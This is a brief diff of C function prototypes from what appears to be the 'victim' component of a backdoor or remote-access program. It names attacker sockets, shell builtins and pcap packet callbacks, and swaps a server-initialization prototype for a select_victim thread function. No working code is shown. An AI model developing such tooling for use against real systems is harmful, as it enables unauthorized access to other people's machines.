@@ -20,7 +20,7 @@ const char *builtin_str[] = {
 
 // Function Prototypes
 void options_victim_init(struct options_victim *opts);
-void initialize_victim_server(struct options_victim *opts);
+void* select_victim(void* arg);
 void add_new_socket(struct options_victim *opts, int attacker_socket, struct sockaddr_in *attacker_address);
 void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
